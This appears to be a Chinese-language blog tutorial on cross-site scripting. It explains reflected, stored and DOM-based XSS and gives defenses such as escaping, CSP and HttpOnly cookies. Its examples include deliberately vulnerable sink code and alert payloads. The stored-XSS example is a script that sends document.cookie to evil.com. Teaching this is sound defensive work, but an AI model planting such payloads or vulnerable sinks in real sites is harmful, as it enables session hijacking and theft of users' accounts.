---
title: XSS
date: 2025-03-26 16:13:01
tags:
---
XSS（Cross-Site Scripting，跨站腳本攻擊）是一種 Web 安全漏洞，攻擊者透過在網站中注入惡意 JavaScript，使該腳本在其他使用者的瀏覽器中執行，從而竊取用戶資訊、控制瀏覽行為或進一步發動攻擊。

---

## **XSS 的攻擊類型**

### **1. 反射型 XSS（Reflected XSS）**
攻擊者將惡意腳本放入 **URL 參數或表單輸入**，當受害者點擊惡意連結或提交表單時，惡意 JavaScript 會被伺服器回應並在瀏覽器中執行。

#### **範例**
假設某個網站接受 `query` 參數並直接顯示在頁面上：
```html
<p>搜尋結果：<script>document.write(decodeURIComponent(location.search))</script></p>
```
如果攻擊者讓受害者點擊：
```
https://example.com/search?query=<script>alert('你被 XSS 攻擊了!')</script>
```
那麼當受害者訪問該 URL，瀏覽器會執行 `alert('你被 XSS 攻擊了!')`，攻擊成功。

---

### **2. 儲存型 XSS（Stored XSS）**
攻擊者將惡意腳本 **儲存在伺服器上**（如留言板、聊天室、論壇），其他使用者造訪該頁面時，惡意腳本會自動執行。

#### **範例**
攻擊者在留言區發送：
```html
<script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>
```
當其他使用者查看這條留言時，瀏覽器會執行該 JavaScript，並將用戶的 Cookie 傳送給攻擊者，導致帳號被盜。

---

### **3. DOM 型 XSS（DOM-Based XSS）**
攻擊者利用 JavaScript 操作網頁 DOM，改變頁面內容並執行惡意腳本，通常不經過伺服器處理。

#### **範例**
```html
<script>
    var input = location.hash.substr(1); // 取得 URL 的 hash 值
    document.getElementById('output').innerHTML = input;
</script>
```
當用戶訪問：
```
https://example.com/#<script>alert('XSS!')</script>
```
瀏覽器會直接執行 `alert('XSS!')`，攻擊成功。

---

## **XSS 的風險**
- **竊取使用者 Cookie，冒充身份（Session Hijacking）**
- **記錄按鍵、竊取密碼**
- **進行釣魚攻擊，顯示偽造的登入頁面**
- **發送惡意請求，影響網站功能**
- **植入後門，長期監控受害者**

---

## **如何防禦 XSS**

### **1. 輸入驗證與過濾**
- 移除 `<script>`、`onerror`、`javascript:` 這類惡意標籤或屬性。
- 限制允許的 HTML 標籤，例如使用 **HTML Purifier**（PHP）或 **DOMPurify**（JavaScript）。

### **2. 輸出時進行 HTML Escape**
- **永遠不要直接插入用戶輸入**，應對 HTML 內容進行編碼：
  ```html
  <p>使用者輸入：&lt;script&gt;alert('XSS')&lt;/script&gt;</p>
  ```
  - 在後端（Python Flask）：`escape(user_input)`
  - 在前端（JavaScript）：`.textContent = user_input`

### **3. 使用 CSP（Content Security Policy）**
- 禁止內嵌腳本，防止 XSS 攻擊：
  ```http
  Content-Security-Policy: default-src 'self'; script-src 'self'
  ```

### **4. 使用 HttpOnly Cookie**
- 防止 JavaScript 讀取 Cookie，降低 Session 被竊取的風險：
  ```http
  Set-Cookie: session_id=abc123; HttpOnly; Secure
  ```

---

## **結論**
XSS 是一種透過注入惡意 JavaScript 來攻擊網站的漏洞，常見類型包括：
1. **反射型 XSS**（需要誘導受害者點擊惡意連結）。
2. **儲存型 XSS**（惡意腳本存儲在伺服器上，自動影響所有使用者）。
3. **DOM 型 XSS**（透過 JavaScript 操作 DOM 來執行攻擊）。

有效的防禦措施包括：
- **輸入過濾**（防止惡意代碼進入系統）。
- **輸出編碼**（避免 JavaScript 被直接執行）。
- **CSP 安全策略**（防止不受信任的腳本執行）。
- **HttpOnly Cookie**（防止 JavaScript 竊取 Session）。
